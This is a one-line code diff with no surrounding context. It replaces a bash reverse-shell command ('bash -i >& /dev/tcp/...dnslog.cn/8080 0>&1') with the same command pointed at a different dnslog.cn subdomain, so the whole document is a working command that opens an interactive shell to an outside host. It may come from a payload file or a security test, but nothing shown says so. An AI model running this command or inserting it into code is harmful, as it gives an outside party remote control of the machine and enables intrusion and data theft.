@@ -1,1 +1,1 @@
-bash -i >& /dev/tcp/jfk5m0.dnslog.cn/8080 0>&1
+bash -i >& /dev/tcp/iu1b7m.dnslog.cn/8080 0>&1
